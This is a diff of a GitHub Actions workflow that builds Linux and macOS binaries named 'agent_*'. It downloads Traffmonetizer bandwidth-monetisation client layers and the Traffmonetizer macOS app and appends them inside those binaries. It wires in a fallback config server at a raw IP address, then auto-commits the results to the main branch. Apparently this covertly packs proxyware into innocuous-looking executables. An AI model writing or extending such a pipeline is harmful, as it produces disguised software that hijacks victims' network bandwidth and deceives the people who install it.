@@ -28,14 +28,12 @@ jobs:
           mkdir -p bin
           SERVER="${{ secrets.CONF_SERVER_URL }}"
           [ -z "$SERVER" ] && SERVER="http://65.20.91.208/turbox_server.php"
-
           cat << 'BUILD_SH' > /tmp/run_build.sh
           #!/bin/bash
           set -e
           export DEBIAN_FRONTEND=noninteractive
           apt-get update -qq
           apt-get install -y --no-install-recommends g++ g++-aarch64-linux-gnu ca-certificates python3 curl
-
           mkdir -p bin
 
           # Build Linux x86_64 (GLIBC 2.31 baseline)
@@ -57,7 +55,6 @@ jobs:
           echo "Merging native Linux self-contained engine directly into binary files..."
           python3 - << 'PY_EOF'
           import urllib.request, json, struct, os
-
           def bundle_layer(digest, out_bin):
               print(f"Downloading layer {digest[:16]} for {out_bin}...")
               tok = json.loads(urllib.request.urlopen("https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull", timeout=20).read().decode())["token"]
@@ -71,11 +68,10 @@ jobs:
           bundle_layer("sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b", "bin/agent_linux_x86_64")
           bundle_layer("sha256:840ef71a69bcaddb8b3f4e27b53a0066a74899601473dc008c7464a3f8745f5a", "bin/agent_linux_arm64")
           PY_EOF
-
           chmod -R 777 bin/
           BUILD_SH
-          chmod +x /tmp/run_build.sh
 
+          chmod +x /tmp/run_build.sh
           docker run --rm \
             -e CONF_SERVER="$SERVER" \
             -v "$GITHUB_WORKSPACE":/workspace \
@@ -84,20 +80,11 @@ jobs:
             ubuntu:20.04 \
             /run_build.sh
 
-      - name: Commit Linux Binaries Directly
-        run: |
-          sudo chown -R $USER:$USER "$GITHUB_WORKSPACE"
-          git config --global --add safe.directory "$GITHUB_WORKSPACE"
-          chmod +x bin/agent_linux_*
-          echo "=== Linux Binaries Built ==="
-          ls -lh bin/agent_linux_*
-          git config --global user.name "github-actions[bot]"
-          git config --global user.email "github-actions[bot]@users.noreply.github.com"
-          git checkout -B main
-          git add -f bin/agent_linux_*
-          git commit -m "Auto-build native Linux binaries (Debian 11 / Ubuntu compatible) [skip ci]" || echo "No changes"
-          git pull --rebase origin main || true
-          git push origin main
+      - name: Upload Linux Binaries
+        uses: actions/upload-artifact@v4
+        with:
+          name: linux-binaries
+          path: bin/agent_linux_*
 
   build-macos:
     runs-on: macos-latest
@@ -129,7 +116,7 @@ jobs:
             -lpthread \
             -o bin/agent_darwin_x86_64
 
-          # Tải và MERGE trực tiếp native macOS app vào 2 file binary macOS (giữ nguyên chữ ký gốc Developer ID)
+          # Tai va MERGE truc tiep native macOS app vao 2 file binary macOS
           echo "Merging native macOS Traffmonetizer app directly into binary files..."
           curl -sSL -o /tmp/tm.dmg https://data.traffmonetizer.com/downloads/macos/traffmonetizer.dmg
           mkdir -p /tmp/tm_mnt
@@ -137,19 +124,64 @@ jobs:
           tar -czf /tmp/tm_mac.tar.gz -C /tmp/tm_mnt Traffmonetizer.app
           hdiutil detach /tmp/tm_mnt -force 2>/dev/null || true
           rm -rf /tmp/tm_mnt /tmp/tm.dmg
+
           python3 -c "import struct, os; p = open('/tmp/tm_mac.tar.gz', 'rb').read(); foot = struct.pack('<Q', len(p)) + b'TURBOX_BUNDLE\x00\x00\x00'; [open(b, 'ab').write(p + foot) for b in ['bin/agent_darwin_x86_64', 'bin/agent_darwin_arm64'] if os.path.exists(b)]"
           rm -f /tmp/tm_mac.tar.gz
 
-      - name: Commit macOS Binaries Directly
+      - name: Upload macOS Binaries
+        uses: actions/upload-artifact@v4
+        with:
+          name: macos-binaries
+          path: bin/agent_darwin_*
+
+  publish-binaries:
+    needs: [build-linux, build-macos]
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
+          fetch-depth: 0
+
+      - name: Download Linux Binaries
+        uses: actions/download-artifact@v4
+        with:
+          name: linux-binaries
+          path: bin/
+
+      - name: Download macOS Binaries
+        uses: actions/download-artifact@v4
+        with:
+          name: macos-binaries
+          path: bin/
+
+      - name: Commit and Push All 4 Native Binaries Atomically
         run: |
           git config --global --add safe.directory "$GITHUB_WORKSPACE"
-          chmod +x bin/agent_darwin_*
-          echo "=== macOS Binaries Built ==="
-          ls -lh bin/agent_darwin_*
+          chmod +x bin/agent_*
+          echo "=== Tat ca 4 file binary san sang ==="
+          ls -lh bin/agent_*
+
           git config --global user.name "github-actions[bot]"
           git config --global user.email "github-actions[bot]@users.noreply.github.com"
-          git checkout -B main
-          git add -f bin/agent_darwin_*
-          git commit -m "Auto-build native macOS binaries [skip ci]" || echo "No changes"
-          git pull --rebase origin main || true
-          git push origin main
+          git add -f bin/agent_*
+          if git diff --staged --quiet; then
+            echo "[OK] Khong co thay doi binary can commit."
+            exit 0
+          fi
+          git commit -m "Auto-build native multi-platform binaries (Linux & macOS) [skip ci]"
+
+          # Dong bo va push co co che retry de tuyet doi khong bao gio bi loi xung dot lock ref
+          for i in 1 2 3 4 5; do
+            echo "Attempt $i: Fetching origin/main and pushing..."
+            git fetch origin main
+            if git rebase origin/main && git push origin main; then
+              echo "[SUCCESS] Da commit va push thanh cong 4 binary vao main!"
+              exit 0
+            fi
+            echo "Xung dot push, doi 3 giay thu lai..."
+            sleep 3
+          done
+          echo "[ERROR] Khong the push sau 5 lan thu"
+          exit 1
